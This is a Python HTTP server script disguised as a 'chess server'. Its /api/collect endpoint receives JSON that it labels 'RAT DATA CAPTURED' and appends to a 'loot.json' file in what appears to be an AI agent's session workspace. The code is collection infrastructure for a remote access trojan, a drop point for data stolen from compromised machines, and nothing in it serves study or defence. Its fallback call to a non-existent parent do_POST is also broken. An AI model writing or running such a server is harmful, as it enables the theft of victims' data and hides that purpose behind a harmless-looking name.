import http.server
import socketserver
import json
import os

PORT = 8080

class ChessHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/api/collect':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data.decode('utf-8'))
                print("[+] RAT DATA CAPTURED:")
                print(json.dumps(data, indent=2))
                
                with open('/workspace/4223cb7a-b42d-4e3c-9755-0c7220908d85/sessions/agent_0a418633-17f0-4e3a-b2fb-18e5684260f9/loot.json', 'a') as f:
                    f.write(json.dumps(data) + '\n')
            except Exception as e:
                print("Error parsing payload:", e)
                
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"status":"ok"}')
        else:
            super().do_POST()

Handler = ChessHandler

with socketserver.TCPServer(("", PORT), Handler) as httpd:
    print(f"Serving chess server at port {PORT}")
    httpd.serve_forever()
